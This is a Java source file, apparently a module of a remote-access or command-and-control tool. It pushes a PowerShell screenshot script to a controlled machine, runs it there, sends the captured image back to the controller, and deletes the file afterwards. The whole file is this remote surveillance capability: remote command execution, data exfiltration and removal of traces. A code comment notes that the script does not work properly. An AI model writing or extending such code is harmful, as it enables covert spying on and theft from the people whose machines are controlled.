package commands;

import java.io.File;
import java.io.IOException;

import connection.Controller;

public class ScreenShotCommand extends Command{

	public ScreenShotCommand() {
		super("screenshot");
	}

	@Override
	public void execute(Controller ctrl) throws IOException {
		// Current PowerShell script does not work properly :(
		ctrl.receiveFile("Take-ScreenShot.ps1");
		ctrl.execute(". .\\Take-ScreenShot.ps1");
		String path = ctrl.execute("Get-Location");
		path = path.split("\n")[3];
		path = path + "\\";
		path = path.replace("[", "`[");
		path = path.replace("]", "`]");
		ctrl.execute("Take-ScreenShot -file \"" + path + "screenshot.png\"");
		ctrl.sendMsg("Screenshot taken");
		File screenshot = new File("screenshot.png");
		ctrl.sendFile(screenshot);
		ctrl.execute("rm screenshot.png");
	}

}
